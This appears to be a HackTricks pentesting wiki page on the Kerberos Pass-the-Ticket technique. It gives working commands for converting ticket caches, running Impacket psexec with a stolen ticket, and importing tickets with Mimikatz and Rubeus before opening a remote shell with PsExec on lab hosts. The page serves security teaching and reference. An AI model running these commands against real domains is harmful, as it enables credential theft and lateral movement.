# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Overview

In a Pass-the-Ticket (PtT) attack, an adversary uses a stolen Kerberos ticket to authenticate as the ticket's principal without possessing that account's password. A ticket-granting ticket (TGT) can be used to request service tickets, while a stolen service ticket is limited to its target service and validity period.<sup>[[1]](#references)</sup>

For ticket acquisition techniques, see:

- [Harvesting tickets from Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Harvesting tickets from Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Converting Linux and Windows Ticket Formats

Kerberos caches commonly appear as MIT `ccache` files on Linux and `.kirbi` files on Windows. `ticket_converter` converts between these formats using an input ticket and output path.<sup>[[2]](#references)</sup>

```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```

Kekeo also provides Kerberos ticket tooling on Windows.<sup>[[3]](#references)</sup>

## Using a Ticket

On Linux, point `KRB5CCNAME` to the cache and instruct an Impacket client to use Kerberos without prompting for a password:<sup>[[4]](#references)</sup>

```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

On Windows, Mimikatz or Rubeus can import a `.kirbi` ticket into the current logon session. Use `klist` to inspect the resulting cache.<sup>[[5]](#references)[[6]](#references)</sup>

```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

Ticket import does not grant privileges beyond those represented by the ticket and the target service's authorization policy. Expired, revoked, malformed, or incorrectly scoped tickets may fail.<sup>[[1]](#references)</sup>

For broader Kerberos attack context and related ticket-acquisition techniques, see Tarlogic's Kerberos attack guide.<sup>[[7]](#references)</sup>

## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Impacket examples](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Kerberos attack techniques](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
